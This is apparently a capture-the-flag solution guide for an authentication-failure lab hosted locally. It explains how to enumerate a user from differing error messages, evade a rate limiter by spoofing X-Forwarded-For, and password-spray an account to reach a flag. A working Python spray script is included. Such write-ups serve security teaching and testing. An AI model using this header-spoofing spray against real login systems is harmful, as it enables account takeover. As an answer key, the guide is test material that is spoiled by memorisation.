# A07 Easy: Solution Guide

### Vulnerability Mechanics
1. **Target Identification:**
   - Inspect `/crew-roster`: Marcus Vance holds role `Chief Flight Dispatcher` (`m.vance`).
   - Inspect `/bulletins`: Flight `AF-802` diplomatic cargo manifest requires Chief Flight Dispatcher clearance.
2. **Account Enumeration:**
   - Submitting an unknown user returns: `"Employee identifier not registered in directory."`
   - Submitting `m.vance` returns: `"Invalid dispatch security key for registered crew member."`
3. **Rate-Limit Evasion:**
   - Submitting 3 failed passwords locks the IP for 60 seconds.
   - The application determines client IP using `X-Forwarded-For`. Sending a unique spoofed IP header on each request (e.g. `X-Forwarded-For: 10.0.0.{i}`) bypasses the rate limiter entirely.
4. **Targeted Spray:**
   - Bulletins identify common operational templates: `AeroFleet2025!`, `FlightOps2026!`, `Dispatch2026!`, `LAXOps2026!`, etc.
   - Spraying candidate passwords with rotating `X-Forwarded-For` succeeds on `Dispatch2026!`.
5. **Flag Retrieval:**
   - Navigate to `/dispatch/manifest/classified` within the authenticated session to retrieve the dynamic flag.

---

### Exploit Script
```python
import requests
import re

BASE_URL = "http://127.0.0.1:6019"
session = requests.Session()

# Candidate passwords from operations audit
CANDIDATES = [
    "AeroFleet2024!",
    "AeroFleet2025!",
    "FlightOps2025!",
    "FlightOps2026!",
    "Dispatch2025!",
    "Dispatch2026!",
    "LAXOps2026!",
    "TerminalLAX2026!"
]

username = "m.vance"
valid_password = None

# Spray credentials with X-Forwarded-For rotation
for idx, pwd in enumerate(CANDIDATES):
    headers = {"X-Forwarded-For": f"10.0.0.{idx + 1}"}
    resp = session.post(f"{BASE_URL}/login", data={
        "username": username,
        "password": pwd
    }, headers=headers, allow_redirects=False)

    if resp.status_code == 302 or "dispatch" in resp.headers.get("Location", ""):
        valid_password = pwd
        print(f"[+] Discovered valid credentials: {username} / {valid_password}")
        break

assert valid_password is not None, "Password spray failed"

# Access classified manifest
manifest_resp = session.get(f"{BASE_URL}/dispatch/manifest/classified")
flag = re.search(r"RTSA\{[^}]+\}", manifest_resp.text).group(0)
print(f"[+] Dynamic Flag: {flag}")
```
